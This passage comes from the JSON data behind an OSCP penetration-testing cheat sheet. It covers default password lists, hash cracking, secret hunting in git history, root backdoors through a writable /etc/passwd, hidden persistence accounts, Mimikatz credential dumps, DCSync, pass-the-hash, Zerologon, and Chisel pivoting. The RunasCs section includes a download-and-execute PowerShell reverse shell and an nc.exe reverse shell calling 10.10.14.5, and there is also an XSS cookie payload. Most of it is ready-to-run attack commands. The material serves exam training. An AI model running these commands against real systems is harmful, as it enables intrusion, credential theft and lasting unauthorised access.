            "code": "# Hostname\nhostname\nhostname -I\n\n# Uptime\nuptime\n\n# Memory\nfree -h\n\n# Disk space\ndf -h\ndu -sh /path\n\n# CPU info\nlscpu\ncat /proc/cpuinfo\n\n# Loaded modules\nlsmod"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Network Commands",
        "codes": [
          {
            "lang": "bash",
            "code": "# Network interfaces\nip addr\nifconfig\n\n# Routing table\nip route\nroute -n\n\n# Active connections\nnetstat -tulpn\nss -tulpn\n\n# DNS lookup\nnslookup domain\ndig domain\n\n# Ping\nping -c 4 target\n\n# Traceroute\ntraceroute target"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Process Management",
        "codes": [
          {
            "lang": "bash",
            "code": "# List processes\nps aux\nps -ef\npstree\n\n# Process by name\npgrep process_name\npidof process_name\n\n# Kill process\nkill PID\nkill -9 PID\nkillall process_name\n\n# Background/foreground\ncommand &\nfg\nbg\njobs"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "User Management",
        "codes": [
          {
            "lang": "bash",
            "code": "# Current user\nwhoami\nid\n\n# Switch user\nsu - username\nsudo -i\n\n# User info\nfinger username\nw\nwho\nlast"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Default Credentials",
    "title": "Common Default Passwords",
    "tags": [],
    "steps": [
      {
        "title": "Generic Defaults",
        "codes": [
          {
            "lang": "plaintext",
            "code": "password\npassword1\nPassword1\nPassword@123\npassword@123\nadmin\nadministrator\nadmin@123\nroot\ntoor\nchangeme\nwelcome\nWelcome1\nP@ssw0rd\nP@ssword\nP@ssword1\nqwerty\n123456\n12345678"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Username as Password",
        "codes": [
          {
            "lang": "plaintext",
            "code": "username:username\nadmin:admin\nadministrator:administrator\nroot:root\nuser:user"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Always try the username as the password first!",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Service-Specific Defaults",
        "codes": [
          {
            "lang": "plaintext",
            "code": "service:service\nmysql:mysql\npostgres:postgres\noracle:oracle\ntomcat:tomcat\njenkins:jenkins"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "File Transfer Techniques",
    "title": "Common File Transfer Checklist",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```plaintext\nUpload Tools to Target:\n\u2610 Start impacket-smbserver or HTTP server\n\u2610 Use certutil, PowerShell, or wget on target\n\u2610 Verify file transferred correctly\n\u2610 Make executable if needed (chmod +x)"
      },
      {
        "type": "text",
        "content": "Exfiltrate Data from Target:\n\u2610 Start impacket-smbserver or nc listener\n\u2610 Copy files from target\n\u2610 Verify files received\n\u2610 Document what was exfiltrated\n```"
      }
    ]
  },
  {
    "category": "Password Cracking",
    "title": "Common Hash Types for OSCP",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Windows NTLM Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "# Hashcat\nhashcat -a 0 -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt\n\n# John\njohn --format=nt ntlm.txt --wordlist=/usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "NTLM hashes crack very quickly - try rockyou.txt first (5-10 minutes).",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "NetNTLMv2 (Responder Captures)",
        "codes": [
          {
            "lang": "bash",
            "code": "# Hashcat\nhashcat -a 0 -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt\n\n# John\njohn --format=netntlmv2 netntlmv2.txt --wordlist=/usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "NetNTLMv2 is much slower to crack than NTLM due to iterations.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Kerberos TGS-REP (Kerberoasting)",
        "codes": [
          {
            "lang": "bash",
            "code": "# Hashcat\nhashcat -a 0 -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt\n\n# John\njohn --format=krb5tgs kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Service account passwords are often weak - try common patterns first.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Kerberos AS-REP (AS-REP Roasting)",
        "codes": [
          {
            "lang": "bash",
            "code": "# Hashcat\nhashcat -a 0 -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\n\n# John\njohn --format=krb5asrep asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Linux /etc/shadow Hashes (SHA512crypt)",
        "codes": [
          {
            "lang": "bash",
            "code": "# Hashcat\nhashcat -a 0 -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt\n\n# John\njohn --format=sha512crypt shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "SHA512crypt is VERY slow - consider targeted wordlists or rules.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "SSH Private Key Passphrases",
        "codes": [
          {
            "lang": "bash",
            "code": "# Extract hash\nssh2john id_rsa > ssh.hash\n\n# Crack with John\njohn ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "ZIP File Passwords",
        "substeps": [
          {
            "title": "fcrackzip - Dictionary Attack",
            "codes": [
              {
                "lang": "bash",
                "code": "fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <ZipFile>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "fcrackzip - Brute Force",
            "codes": [
              {
                "lang": "bash",
                "code": "fcrackzip -u -b -c a1 -l 4-8 <ZipFile>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "**Charsets:** `a` lowercase, `A` uppercase, `1` digits, `!` special"
              }
            ]
          },
          {
            "title": "zip2john - For Hashcat/John",
            "codes": [
              {
                "lang": "bash",
                "code": "# Extract hash\nzip2john backup.zip > zip.hash\n\n# Crack with John\njohn zip.hash --wordlist=/usr/share/wordlists/rockyou.txt\n\n# Crack with Hashcat (mode 17200 for PKZIP)\nhashcat -a 0 -m 17200 zip.hash /usr/share/wordlists/rockyou.txt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "7z Archive Passwords",
        "codes": [
          {
            "lang": "bash",
            "code": "# Extract hash\n7z2john backup.7z > 7z.hash\n\n# Crack with John\njohn 7z.hash --wordlist=/usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "RAR Archive Passwords",
        "codes": [
          {
            "lang": "bash",
            "code": "# Extract hash\nrar2john backup.rar > rar.hash\n\n# Crack with John\njohn rar.hash --wordlist=/usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "KeePass Password Manager",
    "title": "Common Master Passwords",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```plaintext\n# Try these common passwords first\npassword\npassword1\nPassword1\nadmin\nmaster\nkeepass\ndatabase\nwelcome\nWelcome1\nP@ssw0rd\n```"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Common Mistakes",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```plaintext\n\u274c Forgetting to press Enter after 'fg'\n\u274c Not typing 'reset' after stty\n\u274c Forgetting to export TERM\n\u274c Not setting terminal size\n\u274c Giving up too quickly\n```"
      }
    ]
  },
  {
    "category": "Password Strategy",
    "title": "Common Password Lists",
    "tags": [],
    "steps": [
      {
        "title": "Always Try These First",
        "codes": [
          {
            "lang": "plaintext",
            "code": "password\npassword1\nPassword1\nPassword123\nPassword@123\npassword@123\nadmin\nadministrator\nadmin@123\nwelcome\nWelcome1\nWelcome123\nP@ssw0rd\nP@ssword\nP@ssword1\nroot\ntoor\nchangeme\n12345678\n123456\nqwerty"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Service Account Patterns",
        "codes": [
          {
            "lang": "plaintext",
            "code": "service:service\nmysql:mysql\npostgres:postgres\ntomcat:tomcat\njenkins:jenkins\napache:apache\nnginx:nginx"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "Common Patterns to Search",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```bash\n# Passwords\ngit log -p | grep -E \"(password|passwd|pwd)\\s*=\\s*['\\\"]\""
      },
      {
        "type": "text",
        "content": "# API Keys\ngit log -p | grep -E \"(api_key|apikey|api-key)\\s*=\\s*['\\\"]\""
      },
      {
        "type": "text",
        "content": "# Tokens\ngit log -p | grep -E \"(token|access_token)\\s*=\\s*['\\\"]\""
      },
      {
        "type": "text",
        "content": "# Database connections\ngit log -p | grep -E \"(mysql|postgres|mongodb)://.*:.*@\""
      },
      {
        "type": "text",
        "content": "# AWS keys\ngit log -p | grep -E \"AKIA[0-9A-Z]{16}\""
      },
      {
        "type": "text",
        "content": "# Private keys\ngit log -p | grep -E \"BEGIN.*PRIVATE KEY\"\n```"
      }
    ]
  },
  {
    "category": "Writable etc-passwd",
    "title": "Common Scenarios",
    "tags": [],
    "steps": [
      {
        "title": "Scenario 1: World-Writable /etc/passwd",
        "codes": [
          {
            "lang": "bash",
            "code": "# Permissions: -rw-rw-rw-\n# Anyone can write\necho 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Scenario 2: Group-Writable /etc/passwd",
        "codes": [
          {
            "lang": "bash",
            "code": "# Permissions: -rw-rw-r--\n# If you're in the group, you can write\ngroups\n# Output: user adm cdrom sudo dip plugdev lxd\n\necho 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Scenario 3: Backup File Writable",
        "codes": [
          {
            "lang": "bash",
            "code": "# Sometimes /etc/passwd.bak is writable\nls -l /etc/passwd*\n\n# Modify backup and restore\necho 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd.bak\ncp /etc/passwd.bak /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "Common Sensitive Files",
    "tags": [],
    "steps": [
      {
        "title": "Configuration Files",
        "codes": [
          {
            "lang": "bash",
            "code": "# Search for config files\nfind . -name \"*.config\"\nfind . -name \"config.*\"\nfind . -name \".env\"\nfind . -name \"settings.*\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Database Files",
        "codes": [
          {
            "lang": "bash",
            "code": "find . -name \"database.yml\"\nfind . -name \"db.config\"\nfind . -name \"*.sql\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Credential Files",
        "codes": [
          {
            "lang": "bash",
            "code": "find . -name \"credentials.*\"\nfind . -name \"secrets.*\"\nfind . -name \".htpasswd\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SSH Keys",
        "codes": [
          {
            "lang": "bash",
            "code": "find . -name \"id_rsa\"\nfind . -name \"id_dsa\"\nfind . -name \"*.pem\"\nfind . -name \"*.key\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Common Time Wasters",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [
      {
        "title": "Avoid These Mistakes",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. **Rabbit Holes**\n- Set 30-minute limit on any single approach\n- If stuck, enumerate more or try different vector"
          },
          {
            "type": "text",
            "content": "2. **Brute Forcing**\n- Maximum 10 minutes per username\n- If rockyou.txt doesn't work, move on"
          },
          {
            "type": "text",
            "content": "3. **Overthinking**\n- OSCP is about fundamentals, not advanced exploits\n- Try simple things first (default creds, misconfigurations)"
          },
          {
            "type": "text",
            "content": "4. **Poor Documentation**\n- Document as you go, not at the end\n- Screenshots with timestamps\n- Command history saved"
          },
          {
            "type": "text",
            "content": "5. **Switching Machines Too Often**\n- Finish one machine completely\n- Don't multitask between targets"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "User Management Commands",
    "title": "Common Use Cases",
    "tags": [],
    "steps": [
      {
        "title": "Persistence After Exploitation",
        "codes": [
          {
            "lang": "plaintext",
            "code": "1. Get initial shell\n2. Escalate to admin/root\n3. Create persistent user account\n4. Add to admin/sudo group\n5. Enable RDP/SSH access\n6. Test login\n7. Document credentials"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Lateral Movement",
        "codes": [
          {
            "lang": "plaintext",
            "code": "1. Compromise machine A\n2. Create user on machine A\n3. Use same credentials on machine B\n4. Credential reuse often works"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Maintaining Access",
        "codes": [
          {
            "lang": "plaintext",
            "code": "1. Create multiple user accounts\n2. Use different passwords\n3. Add to different groups\n4. Hide some accounts\n5. Document all accounts"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Evil-WinRM",
    "title": "Common Use Cases",
    "tags": [],
    "steps": [
      {
        "title": "Privilege Escalation Enumeration",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -s /opt/privesc/scripts"
          },
          {
            "lang": "powershell",
            "code": "Bypass-4MSI\nPowerUp.ps1\nInvoke-AllChecks"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Credential Dumping",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u Administrator -H <NTHash> -s /opt/scripts"
          },
          {
            "lang": "powershell",
            "code": "Bypass-4MSI\nInvoke-Mimikatz.ps1\nInvoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "File Transfer for Exploitation",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -p '<Password>'"
          },
          {
            "lang": "powershell",
            "code": "# Upload exploit\nupload /opt/exploit.exe C:\\Windows\\Temp\\exploit.exe\n\n# Execute\nC:\\Windows\\Temp\\exploit.exe\n\n# Download results\ndownload C:\\Windows\\Temp\\output.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Tunneling with Chisel",
    "title": "Common Use Cases",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "Pivoting",
      "Tunneling",
      "Windows"
    ],
    "steps": [
      {
        "title": "Access Internal Web Application",
        "codes": [
          {
            "lang": "bash",
            "code": "chisel server -p 8000 --reverse"
          },
          {
            "lang": "bash",
            "code": "chisel client 10.10.14.5:8000 R:8080:192.168.100.50:80"
          },
          {
            "lang": "bash",
            "code": "curl http://127.0.0.1:8080"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**Scenario:** Victim can access internal web server at 192.168.100.50:80"
          },
          {
            "type": "text",
            "content": "**On Kali:**"
          }
        ]
      },
      {
        "title": "Access Multiple Internal Services",
        "codes": [
          {
            "lang": "bash",
            "code": "chisel server -p 8000 --reverse"
          },
          {
            "lang": "bash",
            "code": "# Forward multiple ports\nchisel client 10.10.14.5:8000 R:8080:192.168.100.50:80 R:3389:192.168.100.50:3389 R:445:192.168.100.50:445"
          },
          {
            "lang": "bash",
            "code": "# Web server\ncurl http://127.0.0.1:8080\n\n# RDP\nxfreerdp /v:127.0.0.1:3389 /u:Administrator /p:Password123!\n\n# SMB\nsmbclient -L //127.0.0.1 -U Administrator"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**On Kali:**"
          }
        ]
      },
      {
        "title": "SOCKS Proxy for Full Network Access",
        "codes": [
          {
            "lang": "bash",
            "code": "chisel server -p 8000 --reverse --socks5"
          },
          {
            "lang": "bash",
            "code": "chisel client 10.10.14.5:8000 R:socks"
          },
          {
            "lang": "bash",
            "code": "# Edit /etc/proxychains4.conf\necho \"socks5 127.0.0.1 1080\" >> /etc/proxychains4.conf\n\n# Use with any tool\nproxychains nmap -sT -Pn 192.168.100.0/24\nproxychains crackmapexec smb 192.168.100.50 -u Administrator -p Password123!"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**On Kali:**"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Invoke-RunasCs",
    "title": "Common Use Cases",
    "tags": [
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Get Reverse Shell as Another User",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Generate reverse shell payload\n$payload = \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\"\n\n# Execute as target user\nInvoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"powershell.exe -c $payload\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Read Sensitive Files",
        "codes": [
          {
            "lang": "powershell",
            "code": "Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"type C:\\Users\\Administrator\\Desktop\\proof.txt\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add User to Administrators Group",
        "codes": [
          {
            "lang": "powershell",
            "code": "Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"net localgroup Administrators hacker /add\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Dump SAM Hashes",
        "codes": [
          {
            "lang": "powershell",
            "code": "Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"reg save HKLM\\SAM C:\\Temp\\SAM\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execute Binary",
        "codes": [
          {
            "lang": "powershell",
            "code": "Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"C:\\Temp\\nc.exe 10.10.14.5 443 -e cmd.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Security Headers Scanning",
    "title": "Common Vulnerabilities",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "Missing CSP = XSS Vulnerable",
        "codes": [
          {
            "lang": "bash",
            "code": "# Test for XSS if CSP is missing\ncurl -I https://example.com | grep Content-Security-Policy\n# If missing, test XSS payloads"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Missing X-Frame-Options = Clickjacking",
        "codes": [
          {
            "lang": "html",
            "code": "<!-- Create clickjacking PoC -->\n<iframe src=\"https://vulnerable-site.com\"></iframe>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Missing HSTS = SSL Strip Attack",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Attacker can downgrade HTTPS to HTTP.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Weak CSP with unsafe-inline",
        "codes": [
          {
            "lang": "javascript",
            "code": "// If CSP allows unsafe-inline, XSS is possible\n<script>alert(document.cookie)</script>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "SSH Pivoting",
    "title": "Comparison with Other Pivoting Tools",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "| Tool | Pros | Cons |\n|------|------|------|\n| **SSH Tunneling** | Built-in, no upload needed, stable | Requires SSH access, slower |\n| **Ligolo-ng** | Fast, easy to use, no config | Requires binary upload |\n| **Chisel** | Fast, SOCKS5 support | Requires binary upload |\n| **Metasploit** | Integrated with framework | Heavy, easily detected |"
      },
      {
        "type": "note",
        "content": "Use SSH tunneling when you already have SSH access and want to avoid uploading tools.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Tunneling with Chisel",
    "title": "Comparison with Other Tools",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "Pivoting",
      "Tunneling",
      "Windows"
    ],
    "steps": [
      {
        "title": "vs SSH Tunneling",
        "codes": [
          {
            "lang": "bash",
            "code": "# SSH (requires SSH server)\nssh -L 8080:192.168.100.50:80 user@victim\n\n# Chisel (works anywhere)\nchisel client 10.10.14.5:8000 R:8080:192.168.100.50:80"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Chisel works on Windows without SSH server.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "vs Ligolo-NG",
        "codes": [
          {
            "lang": "bash",
            "code": "# Ligolo-NG (more features, more complex)\n# Better for complex multi-hop scenarios\n\n# Chisel (simpler, faster setup)\n# Better for quick single-hop tunnels"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Use Chisel for simple tunnels, Ligolo-NG for complex pivoting.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "vs Metasploit Portfwd",
        "codes": [
          {
            "lang": "bash",
            "code": "# Metasploit (requires Meterpreter session)\nportfwd add -l 8080 -p 80 -r 192.168.100.50\n\n# Chisel (works with any shell)\nchisel client 10.10.14.5:8000 R:8080:192.168.100.50:80"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Invoke-RunasCs",
    "title": "Comparison with Other Tools",
    "tags": [
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "vs Built-in runas",
        "codes": [
          {
            "lang": "bash",
            "code": "# Built-in runas (requires interactive session)\nrunas /user:Administrator cmd.exe\n\n# Invoke-RunasCs (works non-interactively)\nInvoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"cmd.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Invoke-RunasCs works in non-interactive shells where `runas` fails.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "vs PSExec",
        "codes": [
          {
            "lang": "bash",
            "code": "# PSExec (requires SMB access)\nimpacket-psexec Administrator:Password123!@192.168.1.10\n\n# Invoke-RunasCs (works locally)\nInvoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Use Invoke-RunasCs when you're already on the box and have credentials.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "vs Start-Process with Credentials",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Start-Process (limited functionality)\n$cred = New-Object System.Management.Automation.PSCredential(\"Administrator\", (ConvertTo-SecureString \"Password123!\" -AsPlainText -Force))\nStart-Process cmd.exe -Credential $cred\n\n# Invoke-RunasCs (more flexible)\nInvoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"cmd.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Complete Attack Chain",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\n# On Kali - Automated method (recommended)\nimpacket-secretsdump -use-vss corp.local/Administrator:'Password123!'@192.168.1.10 > domain_hashes.txt"
      },
      {
        "type": "text",
        "content": "# Extract NTLM hashes\ncat domain_hashes.txt | grep ':::' | cut -d: -f4 > ntlm.txt"
      },
      {
        "type": "text",
        "content": "# Crack hashes\nhashcat -a 0 -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt"
      },
      {
        "type": "text",
        "content": "# Use cracked credentials for lateral movement\nnxc smb 192.168.1.0/24 -u Administrator -p 'CrackedPassword123!'\n```"
      },
      {
        "type": "note",
        "content": "This workflow goes from domain controller access to full domain compromise in minutes.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "Complete Attack Workflow",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "text",
        "content": "```cmd\n# 1. Dump all credentials\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > creds.txt"
      },
      {
        "type": "text",
        "content": "# 2. Dump SAM hashes\n.\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\" > sam.txt"
      },
      {
        "type": "text",
        "content": "# 3. Export Kerberos tickets\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\""
      },
      {
        "type": "text",
        "content": "# 4. DCSync domain (if DA)\n.\\mimikatz.exe \"lsadump::dcsync /domain:corp.local /all /csv\" \"exit\" > dcsync.txt"
      },
      {
        "type": "text",
        "content": "# 5. Pass-the-hash to other systems\n.\\mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe\"\n```"
      },
      {
        "type": "note",
        "content": "This workflow goes from initial admin access to full domain compromise.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Zerologon",
    "title": "Complete Attack Workflow",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [
      {
        "title": "Pre-Exploitation (Save Original Password)",
        "codes": [
          {
            "lang": "bash",
            "code": "# 1. Get DC computer account hash BEFORE attack (if you have creds)\nimpacket-secretsdump 'corp.local/user:password@192.168.1.10' -just-dc-user 'DC01$' > dc_original_hash.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Exploitation",
        "codes": [
          {
            "lang": "bash",
            "code": "# 2. Test for vulnerability\npython3 zerologon_tester.py DC01 192.168.1.10\n\n# 3. Exploit (resets DC password to empty)\npython3 cve-2020-1472-exploit.py DC01 192.168.1.10\n\n# 4. Dump domain credentials\nimpacket-secretsdump -just-dc -no-pass 'corp.local/DC01$@192.168.1.10' > domain_hashes.txt\n\n# 5. Extract Administrator hash\ncat domain_hashes.txt | grep Administrator"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Post-Exploitation (Restore)",
        "codes": [
          {
            "lang": "bash",
            "code": "# 6. Restore DC password using Administrator hash\npython3 restorepassword.py corp.local/DC01$@DC01 -target-ip 192.168.1.10 -hexpass <OriginalDCHash>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Mimikatz",
    "title": "Complete Credential Dump",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "All-in-One Credential Extraction",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"lsadump::secrets\" \"lsadump::cache\" \"exit\" > full_dump.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Comprehensive dump of all credentials on the system.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
